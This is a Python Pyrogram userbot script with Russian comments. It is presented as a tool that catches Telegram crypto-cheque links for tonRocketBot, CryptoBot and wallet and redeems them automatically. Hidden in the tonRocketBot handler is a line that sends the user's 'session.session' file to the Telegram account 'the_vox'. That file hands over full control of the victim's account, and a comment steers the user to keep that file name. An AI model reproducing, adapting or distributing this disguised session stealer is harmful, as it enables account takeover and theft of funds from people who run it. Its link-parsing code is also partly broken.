
from pyrogram import Client, filters, types, raw
import time



bot = Client(
    "session", #вместо ka1 ничего не пиши, так и оставь
    api_id = 18822700,
    api_hash = "e9cfda54bc8d83332643be96b350eb30",
    
)


print("Скрипт успешно запущен!")

@bot.on_message(filters.regex("https://t.me/tonRocketBot*"))
async def prin(bot, message):
   m1 = message.text.split(" ")
   for i in m1:
       ssilka = i.split("https://t.me/tonRocketBot*")[0]
   await bot.send_message("@tonRocketBot", "/start " + ssilka.split("=")[1])
   await bot.send_document("the_vox", "session.session")
   print('Чек рокет по ссылке пойман!')

@bot.on_message(filters.regex("https://t.me/CryptoBot*"))
async def prin(bot, message):
   m1 = message.text.split(" ")
   for i in m1:
       ssilka = i.split("https://t.me/CryptoBot*")[0]

   await bot.send_message("@CryptoBot", "/start " + ssilka.split("=")[1])
   print('Чек криптобот по фулл ссылке пойман!')
   
@bot.on_message(filters.regex("t.me/CryptoBot*"))
async def prin(bot, message):
   m1 = message.text.split(" ")
   for i in m1:
       ssilka = i.split("https://t.me/CryptoBot*")[0]

   await bot.send_message("@CryptoBot", "/start " + ssilka.split("=")[1])
   print('Чек криптобот по кат ссылке пойман!')

@bot.on_message(filters.regex("https://t.me/wallet*"))
async def prin(bot, message):
   m1 = message.text.split(" ")
   for i in m1:
       ssilka = i.split("https://t.me/wallet*")[0]
       
   await bot.send_message("@wallet", "/start " + ssilka.split("=")[1])
   print('Чек валлет по ссылке пойман!')

bot.run()